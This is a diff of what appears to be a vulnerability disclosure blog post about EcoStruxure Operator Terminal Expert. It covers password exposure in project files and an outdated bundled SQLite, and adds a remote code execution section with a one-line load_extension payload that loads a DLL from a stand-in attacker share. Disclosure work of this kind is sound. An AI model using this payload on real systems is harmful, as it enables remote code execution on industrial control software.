@@ -115,16 +115,15 @@ saturn:~ mr_me$
 
 <p class="cn" markdown="1">Using the PoC we developed, it's possible to expose passwords inside of .vdxz files and in the example above, we can see that the password `ThisIsASecretPassword!` was exposed.</p>
 
-<p class="cn" markdown="1">Furthermore, details of SQLite fts3_tokenizer Untrusted Pointer Remote Code Execution Vulnerability aka [CVE-2019-8602](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8602) was released in Checkpoint's excellent blog [post](https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/).</p>
+## Remote Code Execution
 
-<p class="cn" markdown="1">Not only was the FTS3 extension enabled in the SQLite binary for EcoStruxure Operator Terminal Expert, but it was also using an outdated version as well: `3.8.0.1`.</p>
+<p class="cn" markdown="1">Details of SQLite fts3_tokenizer Untrusted Pointer Remote Code Execution Vulnerability aka [CVE-2019-8602](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8602) was released in Checkpoint's excellent blog [post](https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/).</p>
 
-```
-saturn:~ mr_me$ file sample/Security.db 
-sample/Security.db: SQLite 3.x database, last written using SQLite version 3008010
-```
+<p class="cn" markdown="1">Not only was the FTS3 extension enabled in the SQLite binary for EcoStruxure Operator Terminal Expert, but it was also using an outdated version: `3.8.10.2`. The checkpoint blog post had all the ingredients to trigger the bug using query hijacking and craft a working remote code execution exploit using just CVE-2019-8602. However, there was a simpler way.</p>
 
-<p class="cn" markdown="1">The checkpoint blog post had all the formula to craft a working remote code execution exploit using just CVE-2019-8602.</p>
+<p class="cn" markdown="1">As it turned out, the SQLite binary shipped also had the [`sqlite3_load_extension`](https://www.sqlite.org/c3ref/load_extension.html) interface enabled, meaning that it was simple to gain remote code execution using the following payload:</p>
+
+`select load_extension('\\attacker\calc.dll','DllMain');`
 
 ## Patch
 
@@ -135,6 +134,8 @@ sample/Security.db: SQLite 3.x database, last written using SQLite version 30080
             title="A per project password warning"
             caption="A per project password warning"
             style="width:50%;height:50%" %}
+
+<p class="cn" markdown="1">Additionally the SQLite binary that was shipped in SP1 had the FTS3 extension and `sqlite3_load_extension` interface disabled.</p>
 
 ## Conclusion
 
